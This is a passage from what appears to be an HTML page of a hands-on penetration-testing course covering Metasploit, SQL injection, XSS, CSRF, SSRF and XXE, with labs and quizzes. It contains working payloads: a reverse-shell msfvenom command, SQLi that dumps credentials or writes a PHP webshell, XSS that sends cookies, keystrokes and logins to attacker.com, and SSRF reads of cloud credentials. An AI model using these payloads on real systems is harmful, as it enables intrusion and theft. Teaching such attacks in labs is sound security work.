+      <li>Launch msfconsole. Search for "vsftpd". Use the backdoor exploit. Set RHOSTS to your Metasploitable IP. Run it. Confirm you have a root shell with <code>id</code>.</li>
+      <li>From the root shell: <code>cat /etc/shadow</code>. Copy all hashes — you'll crack them on Day 27.</li>
+      <li>Search for <code>exploit/multi/samba/usermap_script</code> — this exploits another Metasploitable service (Samba). Exploit it. Compare the shell you get.</li>
+      <li>Set up a Meterpreter session: search <code>exploit/multi/handler</code>, set payload to <code>linux/x86/meterpreter/reverse_tcp</code>, set LHOST to your Kali IP, run. This is your listener for custom payloads.</li>
+      <li>Generate a payload: <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f elf -o shell.elf</code>. Upload to Metasploitable. Execute it. See your Meterpreter session open.</li>
+      <li>In Meterpreter: run <code>sysinfo</code>, <code>getuid</code>, <code>ps</code>, <code>screenshot</code>, and <code>download /etc/passwd /tmp/passwd_loot.txt</code>.</li>
+    </ul>
+  </div>
+</div><!-- /p0 -->
+
+
+<!-- ═════════════════ DAY 23 ═════════════════ -->
+<div class="pnl" id="p1">
+  <div class="dh">
+    <div class="dnum">23</div>
+    <div class="dinfo">
+      <h2>SQL INJECTION</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> Manual SQLi · UNION Attacks · Blind SQLi · sqlmap</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 4 PROGRESS — DAY 23 OF 28</div><div class="pbt"><div class="pbf" style="width:82%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">💉</div>
+    <p><strong>SQL Injection has been the #1 web vulnerability for over two decades.</strong> It occurs when user input is concatenated directly into SQL queries without sanitization. The attacker's input becomes part of the query logic — allowing database extraction, authentication bypass, file read/write, and in some cases remote code execution. It's so common because developers keep making the same mistake.</p>
+  </div>
+
+  <div class="slbl">// 23.1 — WHY SQLi HAPPENS</div>
+  <div class="two">
+    <div class="card">
+      <div class="clbl">VULNERABLE CODE (PHP)</div>
+      <div class="trm" style="margin:0">
+        <div class="tbody" style="font-size:0.74rem">
+<span class="co">// Vulnerable — string concatenation</span>
+<span class="hp">$id</span> = <span class="ht">$_GET</span>[<span class="ha">'id'</span>];
+<span class="hp">$query</span> = <span class="ha">"SELECT * FROM users
+         WHERE id = '</span><span class="hp">$id</span><span class="ha">'"</span>;
+
+<span class="co">// User sends: id=1' OR '1'='1
+// Query becomes:
+// SELECT * FROM users WHERE id = '1' OR '1'='1'
+// Returns ALL rows — authentication bypass!</span></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="clbl">SECURE CODE (Prepared Statements)</div>
+      <div class="trm" style="margin:0">
+        <div class="tbody" style="font-size:0.74rem">
+<span class="co">// Secure — parameterized query</span>
+<span class="hp">$stmt</span> = <span class="hp">$pdo</span>->prepare(
+  <span class="ha">"SELECT * FROM users WHERE id = ?"</span>
+);
+<span class="hp">$stmt</span>->execute([<span class="hp">$_GET</span>[<span class="ha">'id'</span>]]);
+
+<span class="co">// Input is NEVER part of the SQL syntax.
+// '1' OR '1'='1' is treated as a literal
+// string — not SQL. Attack fails completely.</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="slbl">// 23.2 — SQLi TYPES</div>
+
+  <div class="payload-demo">
+    <h4>⚗️ SQLi PAYLOAD REFERENCE — CLICK TO EXPLORE</h4>
+    <div class="pd-tabs">
+      <div class="pd-tab on" onclick="tab(this,'sqli-auth')">Auth Bypass</div>
+      <div class="pd-tab" onclick="tab(this,'sqli-union')">UNION Attack</div>
+      <div class="pd-tab" onclick="tab(this,'sqli-blind')">Blind Boolean</div>
+      <div class="pd-tab" onclick="tab(this,'sqli-time')">Time-Based Blind</div>
+      <div class="pd-tab" onclick="tab(this,'sqli-error')">Error-Based</div>
+      <div class="pd-tab" onclick="tab(this,'sqli-stack')">Stacked / RCE</div>
+    </div>
+
+    <div class="pd-content on" id="sqli-auth">
+      <div class="pd-payload">username: admin'--
+password: anything
+
+Resulting query:
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
+                                           ↑
+                    -- comments out everything after — password check removed!
+Login succeeds as admin with NO password knowledge.
+
+Other variants:
+' OR 1=1--
+' OR 'a'='a
+admin'/*
+') OR ('1'='1</div>
+      <div class="pd-explain">Authentication bypass payloads terminate the WHERE clause early using comments (-- or /**/) or inject always-true conditions. The most impactful single-payload SQLi — directly becomes admin without knowing any credentials. Test every login form's username field with admin'-- first.</div>
+    </div>
+
+    <div class="pd-content" id="sqli-union">
+      <div class="pd-payload">Step 1 — Find number of columns:
+' ORDER BY 1--    (no error)
+' ORDER BY 2--    (no error)
+' ORDER BY 3--    (error! → 2 columns)
+
+Step 2 — UNION to extract data:
+' UNION SELECT 1,2--              (find which columns display)
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,2 FROM information_schema.tables--
+' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
+
+Full extraction:
+' UNION SELECT username,password FROM users-- 
+→ Returns ALL usernames and password hashes from the users table</div>
+      <div class="pd-explain">UNION attacks append a second SELECT to the original query, returning data from a completely different table. Prerequisites: must match the number of columns in the original query, and the data types must be compatible. information_schema is the MySQL metadata database — it contains the names of every table and column in every database.</div>
+    </div>
+
+    <div class="pd-content" id="sqli-blind">
+      <div class="pd-payload">No data returned in response — but behavior changes based on true/false.
+
+' AND 1=1--         → page loads normally (true)
+' AND 1=2--         → page changes / breaks (false)
+
+Extract data character by character:
+' AND SUBSTRING(username,1,1)='a'--  → normal (username starts with 'a')
+' AND SUBSTRING(username,1,1)='b'--  → breaks (not 'b')
+' AND SUBSTRING(username,2,1)='d'--  → normal (2nd char is 'd')
+...
+→ After 20+ requests: username = 'admin'
+
+Extract password hash:
+' AND SUBSTRING(password,1,1)='5'--
+' AND ASCII(SUBSTRING(password,1,1))>100--  (binary search — faster)</div>
+      <div class="pd-explain">Blind SQLi occurs when the application is vulnerable but shows no database output — only a behavioral difference (page changes, error shows vs doesn't). You extract data by asking true/false questions. Automating this with sqlmap is essential — manually extracting a 32-char MD5 hash requires ~160+ requests per character using binary search.</div>
+    </div>
+
+    <div class="pd-content" id="sqli-time">
+      <div class="pd-payload">No visible difference in response — only response time changes.
+
+' AND SLEEP(5)--         → 5-second delay confirms SQLi (MySQL)
+'; WAITFOR DELAY '0:0:5'-- → SQL Server version
+' AND pg_sleep(5)--      → PostgreSQL version
+
+Extract data via timing:
+' AND IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0)--
+→ 5-second delay = first char is 'a'
+→ Instant response = not 'a', try next character
+
+Fully automated time-based extraction:
+sqlmap -u "http://target.com/page?id=1" --technique=T --dbs</div>
+      <div class="pd-explain">Time-based blind SQLi is the most difficult to exploit manually — each bit of information requires measuring response time. Used when Boolean-based blind fails (application shows same response regardless). sqlmap handles this automatically, using binary search to minimize the number of requests needed.</div>
+    </div>
+
+    <div class="pd-content" id="sqli-error">
+      <div class="pd-payload">Force database errors that reveal data in the error message.
+
+MySQL:
+' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+→ Error: XPATH syntax error: '~5.5.61-0ubuntu0.14.04.1'
+
+' AND extractvalue(1,concat(0x7e,(SELECT user())))--
+→ Error: XPATH syntax error: '~root@localhost'
+
+' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)--
+→ Error: XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf99'
+                              ↑ MD5 hash of "password"!</div>
+      <div class="pd-explain">Error-based SQLi uses database functions that force errors containing the data you want to extract. The error message appears in the HTTP response body. Faster than blind SQLi since each request returns actual data, not just true/false. Requires verbose errors to be enabled — production systems often suppress these, falling back to blind techniques.</div>
+    </div>
+
+    <div class="pd-content" id="sqli-stack">
+      <div class="pd-payload">Stacked queries (multiple statements separated by ;):
+'; DROP TABLE users;--          ← destructive! NEVER in pentest!
+'; INSERT INTO admins VALUES('hacker','pwned');--
+'; CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass';--
+
+File operations (MySQL with FILE privilege):
+' UNION SELECT "<?php system($_GET['cmd']); ?>",2 INTO OUTFILE '/var/www/html/shell.php'--
+→ Writes a PHP webshell to the web root!
+→ Access: http://target.com/shell.php?cmd=id
+
+Reading files:
+' UNION SELECT LOAD_FILE('/etc/passwd'),2--
+→ Returns /etc/passwd contents in the response!</div>
+      <div class="pd-explain">Stacked queries and file operations represent the highest-impact SQLi. File write to web root = Remote Code Execution (RCE) — you can execute any OS command. LOAD_FILE reads arbitrary files the MySQL process can access. These require the MySQL user to have FILE privilege (common in development databases, rare in hardened production). This converts a database vulnerability into full server compromise.</div>
+    </div>
+  </div>
+
+  <div class="slbl">// 23.3 — sqlmap: AUTOMATED SQLi</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">sqlmap — AUTOMATED SQL INJECTION EXPLOITATION</div></div>
+    <div class="tbody"><span class="co"># ── BASIC USAGE ───────────────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=abc123;security=low" \
+  --dbs</span>
+<span class="co"># --dbs = enumerate all databases</span>
+
+<span class="ht">[*] starting @ 14:30:00
+[*] testing connection to the target URL
+[*] checking if the target is protected by some kind of WAF/IPS
+[!] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[*] testing for SQL injection on GET parameter 'id'
+
+[14:30:01] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
+[14:30:02] [INFO] GET parameter 'id' is 'MySQL UNION query' injectable
+
+available databases [3]:
+[*] dvwa
+[*] information_schema
+[*] mysql</span>
+
+<span class="co"># ── EXTRACT TABLES FROM DATABASE ─────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">sqlmap -u "http://.../?id=1" --cookie="..." -D dvwa --tables</span>
+<span class="ht">Database: dvwa
+[2 tables]:
++----------+
+| guestbook|
+| users    |
++----------+</span>
+
+<span class="co"># ── DUMP THE USERS TABLE ─────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">sqlmap -u "http://.../?id=1" --cookie="..." -D dvwa -T users --dump</span>
+<span class="ht">Database: dvwa  Table: users
++-----+----------+----------------------------------+
+| id  | user     | password                         |
++-----+----------+----------------------------------+
+| 1   | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |  ← MD5("password")
+| 2   | gordonb  | e99a18c428cb38d5f260853678922e03 |  ← MD5("abc123")
+| 3   | 1337     | 8d3533d75ae2c3966d7e0d4fcc69216b |  ← MD5("charley")
++-----+----------+----------------------------------+</span>
+
+<span class="co"># ── OS SHELL (if MySQL has FILE privilege) ───────────────────</span>
+<span class="pr">$</span> <span class="cm">sqlmap -u "http://.../?id=1" --cookie="..." --os-shell</span>
+<span class="ha">[*] trying to upload file stager on '/var/www/'
+[*] your SQL shell: </span>
+<span class="hg">os-shell> id</span>
+<span class="ht">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+<span class="co"># ── USEFUL FLAGS ─────────────────────────────────────────────</span>
+<span class="co">--level=5         # Increase test depth (1-5, default 1)
+--risk=3          # Increase risk of tests (1-3, default 1)  
+--technique=BEUST # Specific techniques: B=boolean E=error U=union S=stack T=time
+--batch           # Never ask questions, use defaults (script-friendly)
+--threads=10      # Parallel requests (faster)
+--forms           # Auto-detect and test HTML forms
+--crawl=3         # Spider site 3 levels deep before testing</span></div>
+  </div>
+
+  <div class="slbl">// DAY 23 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You test a login form with <code>admin'--</code> as username and any password. You get "Invalid credentials." You then try <code>admin' OR '1'='1'--</code> and also get "Invalid credentials." But when you try <code>admin' AND SLEEP(5)--</code>, the response takes exactly 5 seconds. What does this tell you?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','The server being slow is unlikely to precisely equal 5 seconds matching your SLEEP(5) parameter. This is clearly SQLi-induced delay.')"><span class="qk">A</span> The server is slow — 5 seconds is normal latency, not SQLi</div>
+      <div class="qo" onclick="qa(this,'wrong','The login form being SQL-injectable doesn\'t mean it\'s boolean-based blind. The SLEEP response specifically indicates time-based blind — different type with different exploitation technique.')"><span class="qk">B</span> The login form is vulnerable to boolean-based blind SQLi</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Time-based blind SQLi confirmed. The form IS injectable (SLEEP executed on the DB server), but the application returns the same response regardless of whether the SQL condition is true or false — so boolean-based blind and UNION attacks won\'t work. The app might be hardening the error output or using a WAF that blocks visible differences. Use: sqlmap --technique=T (time-based only) or manually extract data using SLEEP with conditional: AND IF(SUBSTRING(password,1,1)=\'a\', SLEEP(5), 0)-- measuring timing to extract data bit by bit.')"><span class="qk">C</span> Time-based blind SQLi confirmed — the query executes but the app returns identical responses for true/false, so only timing reveals the vulnerability</div>
+      <div class="qo" onclick="qa(this,'wrong','A WAF can sometimes cause delays but wouldn\'t consistently produce exactly 5 seconds. A WAF would block ALL your payloads equally or inconsistently.')"><span class="qk">D</span> A WAF is blocking your attempts and adding a 5-second delay as a penalty</div>
+    </div>
+    <div class="qfb" id="q1"></div>
+  </div>
+</div><!-- /p1 -->
+
+
+<!-- ═════════════════ DAY 24 ═════════════════ -->
+<div class="pnl" id="p2">
+  <div class="dh">
+    <div class="dnum">24</div>
+    <div class="dinfo">
+      <h2>CROSS-SITE SCRIPTING (XSS)</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> Reflected · Stored · DOM-Based · Cookie Theft · Defacement</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 4 PROGRESS — DAY 24 OF 28</div><div class="pbt"><div class="pbf" style="width:86%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">📜</div>
+    <p><strong>XSS is the most prevalent web vulnerability.</strong> It occurs when user-supplied input is reflected in a web page without proper encoding, allowing an attacker to inject JavaScript that executes in victim browsers. The attacker's code runs with the same privileges as the page — meaning it can steal cookies, redirect users, log keystrokes, and make API requests on behalf of the victim.</p>
+  </div>
+
+  <div class="slbl">// 24.1 — THREE TYPES OF XSS</div>
+  <table class="tbl">
+    <tr><th>TYPE</th><th>WHERE PAYLOAD LIVES</th><th>WHO IS AFFECTED</th><th>SEVERITY</th></tr>
+    <tr>
+      <td><span class="hl">Reflected</span></td>
+      <td>URL parameter — reflected immediately in response. Not stored.</td>
+      <td>Only users tricked into clicking a crafted URL. Requires social engineering.</td>
+      <td><span class="ha2">Medium–High</span></td>
+    </tr>
+    <tr>
+      <td><span class="hl">Stored (Persistent)</span></td>
+      <td>Saved in database — returned to all users who view the page.</td>
+      <td>EVERY user who views the page containing the payload. No social engineering needed.</td>
+      <td><span class="hl">Critical</span></td>
+    </tr>
+    <tr>
+      <td><span class="ha2">DOM-Based</span></td>
+      <td>JavaScript in the page reads from URL/storage and writes to DOM without going to server.</td>
+      <td>Users tricked into visiting crafted URLs. The payload never reaches the server — bypasses server-side filters.</td>
+      <td><span class="ha2">Medium–High</span></td>
+    </tr>
+  </table>
+
+  <div class="slbl">// 24.2 — XSS PAYLOAD LIBRARY</div>
+  <div class="payload-demo">
+    <h4>📌 XSS PAYLOADS — FROM DETECTION TO EXPLOITATION</h4>
+    <div class="pd-tabs">
+      <div class="pd-tab on" onclick="tab(this,'xss-basic')">Detection</div>
+      <div class="pd-tab" onclick="tab(this,'xss-steal')">Cookie Theft</div>
+      <div class="pd-tab" onclick="tab(this,'xss-keylog')">Keylogger</div>
+      <div class="pd-tab" onclick="tab(this,'xss-bypass')">Filter Bypass</div>
+      <div class="pd-tab" onclick="tab(this,'xss-dom')">DOM-Based</div>
+    </div>
+
+    <div class="pd-content on" id="xss-basic">
+      <div class="pd-payload">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;input autofocus onfocus=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+
+# If alert(1) pops — XSS confirmed. document.domain shows which origin executes.
+# Try all variants — different contexts need different tags.
+# No alert? The tag might be filtered. Try the bypass tab.</div>
+      <div class="pd-explain">Basic detection: inject into every input field and URL parameter. The goal is just to confirm JavaScript execution — not to alert per se, but alert(1) is the universal "it works" signal. In a real engagement, you'd never stop at alert() — it's just proof-of-concept for the report before moving to impact demonstration.</div>
+    </div>
+
+    <div class="pd-content" id="xss-steal">
+      <div class="pd-payload"># Cookie theft — steal session token and send to attacker's server
+&lt;script&gt;
+  document.location='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)
+&lt;/script&gt;
+
+# Image-based (less visible, more reliable):
+&lt;img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)"&gt;
+
+# XSS Hunter / Interactsh — blind XSS detection:
+&lt;script src="https://your-xss-hunter.xss.ht"&gt;&lt;/script&gt;
+# Fires callback when any user (including admins) triggers your payload
+# Captures cookies, URL, DOM, screenshots — even if you can't see the response
+
+# Your steal server (simple Python):
+# python3 -c "from http.server import *; HTTPServer(('',80),BaseHTTPRequestHandler).serve_forever()"
+# → watch requests in terminal: GET /steal?c=PHPSESSID=abc123...
+# → paste that cookie into your browser → you ARE the victim</div>
+      <div class="pd-explain">Cookie theft converts XSS into account takeover. The victim clicks a link or visits a page with your stored payload — their browser sends their session cookie to your server. You use that cookie in your browser, bypassing authentication entirely. This is why HttpOnly cookie flag exists — it blocks document.cookie access. But even with HttpOnly, you can still make authenticated API requests on their behalf from within the XSS.</div>
+    </div>
+
+    <div class="pd-content" id="xss-keylog">
+      <div class="pd-payload"># Keylogger — capture everything typed on the page
+&lt;script&gt;
+document.addEventListener('keydown', function(e) {
+  fetch('https://attacker.com/keys?k=' + encodeURIComponent(e.key));
+});
+&lt;/script&gt;
+
+# Form hijack — intercept form submission data
+&lt;script&gt;
+document.querySelector('form').addEventListener('submit', function(e) {
+  var data = new FormData(this);
+  fetch('https://attacker.com/form', {
+    method: 'POST',
+    body: JSON.stringify(Object.fromEntries(data))
+  });
+});
+&lt;/script&gt;
+
+# Credential harvesting — inject fake login form overlay
+&lt;script&gt;
+document.body.innerHTML = '&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff"&gt;' +
+'&lt;form action="https://attacker.com/creds" method="POST"&gt;' +
+'&lt;h3&gt;Session expired. Please re-enter credentials.&lt;/h3&gt;' +
+'&lt;input name="user" placeholder="Username"&gt;' +
+'&lt;input type="password" name="pass" placeholder="Password"&gt;' +
+'&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;';
+&lt;/script&gt;</div>
+      <div class="pd-explain">Advanced XSS exploitation goes far beyond alert(). Keyloggers capture credentials in real-time. Form hijacking intercepts login submissions before they reach the real server. Fake login overlays (phishing within the legitimate domain) are extremely convincing because the URL bar shows the real site — victims have no reason to suspect the login form is fake. These are all real attacks documented in bug bounty reports.</div>
+    </div>
+
+    <div class="pd-content" id="xss-bypass">
+      <div class="pd-payload"># Common filter bypasses when &lt;script&gt; is blocked:
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;              # Case variation
+&lt;script&gt;alert`1`&lt;/script&gt;              # Backtick instead of ()
+&lt;svg/onload=alert(1)&gt;                  # SVG event handler
+&lt;img src=1 onerror=alert(1)&gt;           # Error event
+&lt;iframe onload=alert(1)&gt;               # iframe event
+javascript:alert(1)                     # In href attribute context
+
+# When quotes are filtered:
+&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;
+&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;
+
+# Double encoding (URL encoded once more):
+%253Cscript%253Ealert(1)%253C%2Fscript%253E
+# Some WAFs decode once, see %3Cscript, block it.
+# But server decodes again: %3C → &lt; → &lt;script&gt; passes through!
+
+# HTML entity encoding bypass:
+&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;</div>
+      <div class="pd-explain">WAFs and filters look for specific patterns — &lt;script&gt;, onerror=, javascript:. Bypasses work by using the browser's permissive parsing against the filter's rigid pattern matching. Browsers accept uppercase tags, backtick syntax, and event handlers in dozens of HTML elements. The PortSwigger XSS cheat sheet (portswigger.net/web-security/cross-site-scripting/cheat-sheet) has 600+ bypass payloads organized by context.</div>
+    </div>
+
+    <div class="pd-content" id="xss-dom">
+      <div class="pd-payload"># DOM XSS: vulnerable JavaScript reads from URL, writes to DOM
+# Vulnerable code:
+document.getElementById('search').innerHTML = location.search.split('search=')[1];
+# URL: http://target.com/search?search=&lt;img src=x onerror=alert(1)&gt;
+# The payload is never sent to the server — it lives only in the URL
+# Server-side filters see nothing. WAF sees nothing. Browser executes it.
+
+# Common DOM sources (attacker-controlled input):
+location.href          # Entire URL
+location.search        # ?query=string
+location.hash          # #fragment
+document.referrer      # Referrer header
+window.name            # Window name (cross-tab)
+
+# Common DOM sinks (dangerous functions that execute input):
+innerHTML              # ← Most dangerous: parses HTML including scripts
+document.write()       # ← Dangerous: writes directly to document
+eval()                 # ← Execute as code
+setTimeout(input,0)    # ← Execute as code after delay
+location.href = input  # ← javascript: URI possible</div>
+      <div class="pd-explain">DOM-based XSS is the hardest to detect because it's invisible to server-side scanners — the payload travels in the URL fragment (#) which browsers never send to the server. You must read the client-side JavaScript to find it. Look for JavaScript that reads from URL/document properties (sources) and writes to dangerous functions (sinks) without sanitization. PortSwigger's DOM Invader Burp extension automates DOM sink detection.</div>
+    </div>
+  </div>
+
+  <div class="slbl">// DAY 24 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">A blog application lets users post comments. You post: <code>&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code> as a comment. It saves successfully. Three days later you receive 47 requests to evil.com with different session cookies. What type of XSS is this, and why is it far more dangerous than reflected XSS?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Reflected XSS requires each victim to click a crafted URL separately. You wouldn\'t get 47 different victims automatically without sending 47 different malicious links.')"><span class="qk">A</span> Reflected XSS — 47 users all clicked your malicious link</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Stored (Persistent) XSS. Your payload was saved to the database and executes automatically in every browser that loads the comments page — no user interaction or social engineering required. The 47 victims had no idea they were attacked. Stored XSS is classified as Critical because: (1) It persists indefinitely until removed, (2) It affects ALL users including admins (their admin session cookies are the most valuable), (3) No click required — simply viewing the page triggers it, (4) On high-traffic pages it can compromise thousands of accounts. In 2014, a single stored XSS on eBay affected 145 million users.')"><span class="qk">B</span> Stored (Persistent) XSS — payload saved in DB executes automatically for every user who views the page, requiring zero social engineering</div>
+      <div class="qo" onclick="qa(this,'wrong','DOM-based XSS lives in the URL, not in a database. It cannot persist across sessions or affect multiple users automatically — each victim needs a specific crafted URL.')"><span class="qk">C</span> DOM-Based XSS — the JavaScript manipulated the DOM for each visitor</div>
+      <div class="qo" onclick="qa(this,'wrong','CSRF forces users to make requests — it doesn\'t execute arbitrary JavaScript or steal cookies. CSRF attacks actions, XSS attacks identity/sessions.')"><span class="qk">D</span> CSRF attack — the comment form forged requests on behalf of users</div>
+    </div>
+    <div class="qfb" id="q2"></div>
+  </div>
+</div><!-- /p2 -->
+
+
+<!-- ═════════════════ DAY 25 ═════════════════ -->
+<div class="pnl" id="p3">
+  <div class="dh">
+    <div class="dnum">25</div>
+    <div class="dinfo">
+      <h2>CSRF · SSRF · XXE</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> Request Forgery · Server-Side Requests · XML External Entities</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 4 PROGRESS — DAY 25 OF 28</div><div class="pbt"><div class="pbf" style="width:89%"></div></div></div>
+
+  <div class="slbl">// 25.1 — CSRF: CROSS-SITE REQUEST FORGERY</div>
+  <div class="card">
+    <div class="clbl">THE CONFUSED DEPUTY ATTACK</div>
+    <p>CSRF tricks a <span class="hl">victim's browser</span> into making unauthorized requests to a site where they're authenticated. The browser automatically includes cookies — so the server sees a legitimate authenticated request. The victim doesn't know anything happened. The attacker never needs to see the response.</p>
+  </div>
+
+  <div class="two">
+    <div class="trm">
+      <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">CSRF ATTACK — HTML PAYLOAD</div></div>
+      <div class="tbody" style="font-size:0.73rem"><span class="co">&lt;!-- On attacker's site: evil.com/trap.html --&gt;</span>
+<span class="ha">&lt;html&gt;</span>
+<span class="ha">&lt;body onload="document.forms[0].submit()"&gt;</span>
+<span class="hp">&lt;form action="https://bank.com/transfer"
+      method="POST"&gt;</span>
+  <span class="ht">&lt;input name="to" value="attacker_account"&gt;</span>
+  <span class="ht">&lt;input name="amount" value="10000"&gt;</span>
+<span class="hp">&lt;/form&gt;</span>
+<span class="ha">&lt;/body&gt;&lt;/html&gt;</span>
+
+<span class="co"># Victim visits evil.com while logged into bank.com
+# Browser auto-submits the form with bank.com cookies
+# Bank sees legitimate transfer request from authenticated user
+# $10,000 transferred. Victim has no idea.</span></div>
+    </div>
+    <div class="card">
+      <div class="clbl">CSRF DEFENSES</div>
+      <ul class="ck">
+        <li><strong>CSRF Token:</strong> Unique secret per-form, verified server-side. Attacker can't know the token. Gold standard defense.</li>
+        <li><strong>SameSite=Strict cookie:</strong> Browser won't send cookie on cross-site requests. Blocks most CSRF without any code.</li>
+        <li><strong>Origin / Referer header check:</strong> Verify request originated from the same domain.</li>
+        <li><strong>Custom Request Headers:</strong> Ajax requests with custom headers can't be forged cross-origin (CORS blocks them).</li>
+        <li><strong>Re-authentication:</strong> Require password entry for sensitive actions (bank transfer, email change).</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="slbl">// 25.2 — SSRF: SERVER-SIDE REQUEST FORGERY</div>
+  <div class="note nd">
+    <div class="nico">🔥</div>
+    <p><strong>SSRF is one of the most critical modern web vulnerabilities</strong> — it rose to OWASP #10 in 2021. It occurs when a server makes HTTP requests based on attacker-controlled input. The attacker uses the server itself as a proxy to reach internal resources. In cloud environments, SSRF often leads to complete cloud account takeover via metadata endpoints.</p>
+  </div>
+
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">SSRF ATTACK CHAINS</div></div>
+    <div class="tbody"><span class="co"># Vulnerable code (server fetches URL from user input):
+# POST /fetch {"url": "https://legitimate-site.com/image.jpg"}
+# Server fetches the URL and returns content to user</span>
+
+<span class="co"># ── INTERNAL NETWORK SCANNING via SSRF ────────────────────────</span>
+POST /fetch HTTP/1.1
+{"url": "<span class="ha">http://192.168.1.1</span>"}    <span class="co">← probe internal router (200 = exists)</span>
+{"url": "<span class="ha">http://192.168.1.50:3306</span>"}  <span class="co">← probe internal MySQL (response reveals it's open)</span>
+{"url": "<span class="ha">http://10.0.0.5:8080</span>"}  <span class="co">← internal Jenkins? Kubernetes? Admin panel?</span>
+
+<span class="co"># ── AWS METADATA ENDPOINT — THE CLOUD KILLER ──────────────────</span>
+{"url": "<span class="ha">http://169.254.169.254/latest/meta-data/</span>"}
+<span class="ht">→ Returns: ami-id, hostname, iam, instance-action, instance-id...</span>
+
+{"url": "<span class="ha">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>"}
+<span class="ht">→ Returns: EC2-role-name</span>
+
+{"url": "<span class="ha">http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-role-name</span>"}
+<span class="ht">→ Returns:
+{
+  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE1OPTgk..."
+}</span>
+<span class="ha"># These are LIVE AWS credentials for the EC2 role.
+# Use them with aws-cli to access S3 buckets, RDS databases, Lambda functions.
+# This is how the Capital One breach happened — $80M fine, 100M records.</span>
+
+<span class="co"># ── FILE READ via SSRF ────────────────────────────────────────</span>
+{"url": "<span class="ha">file:///etc/passwd</span>"}        <span class="co">← read local files (if file:// allowed)</span>
+{"url": "<span class="ha">file:///etc/shadow</span>"}        <span class="co">← password hashes (needs root)</span>
+{"url": "<span class="ha">dict://127.0.0.1:6379/INFO</span>"} <span class="co">← probe Redis without HTTP</span></div>
+  </div>
+
+  <div class="slbl">// 25.3 — XXE: XML EXTERNAL ENTITY INJECTION</div>
+  <div class="card">
+    <div class="clbl">WHEN XML PARSES ATTACKER CONTENT</div>
+    <p>XXE occurs when an application parses XML and the XML parser allows external entity references. An attacker-defined entity can reference local files, internal URLs, or execute OS commands in some parsers. Any application that accepts XML (SOAP APIs, file upload of .docx/.xlsx, SVG upload) is a potential target.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">XXE PAYLOADS</div></div>
+    <div class="tbody"><span class="co"># ── BASIC FILE READ ──────────────────────────────────────────</span>
+<span class="ha">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</span>
+
+<span class="co"># If the app returns the XML value in the response:
+# &lt;data&gt;root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:...&lt;/data&gt;
+# Complete /etc/passwd returned. Works on Java, .NET, Python lxml with old defaults.</span>
+
+<span class="co"># ── SSRF via XXE ─────────────────────────────────────────────</span>
+<span class="ha">&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</span>
